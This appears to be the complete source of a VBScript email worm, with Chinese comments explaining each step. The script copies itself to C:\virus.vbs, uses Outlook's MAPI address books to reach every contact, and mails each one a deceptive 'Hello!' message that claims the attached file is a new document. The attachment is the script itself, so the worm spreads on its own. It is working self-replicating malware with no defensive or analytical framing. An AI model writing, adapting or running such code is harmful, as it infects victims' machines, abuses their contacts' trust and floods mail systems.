Set objFs=CreateObject("Scripting.FileSystemObject")
objFs.GetFile(WScript.ScriptFullName).Copy("C:\virus.vbs") 
Set objOA=Wscript.CreateObject("Outlook.Application") '创建一个OUTLOOK应用的对象 
Set objMapi=objOA.GetNameSpace("MAPI")'取得MAPI名字空间 
For i=1 to objMapi.AddressLists.Count        '遍历地址簿 
Set objAddList=objMapi.AddressLists(i) 
For j=1 To objAddList. AddressEntries.Count 
Set objMail=objOA.CreateItem(0) 
objMail.Recipients.Add(objAddList. AddressEntries(j)) '取得邮件地址，收件人 
objMail.Subject = "你好!" 
objMail.Body = "这次给你的附件是我的新文档！" 
objMail.Attachments.Add("c:\virus.vbs")  '把自己作为附件扩散出去 
objMail.Send   '发送邮件 
Next 
Next 
Set objMapi=Nothing 
Set objOA=Nothing 

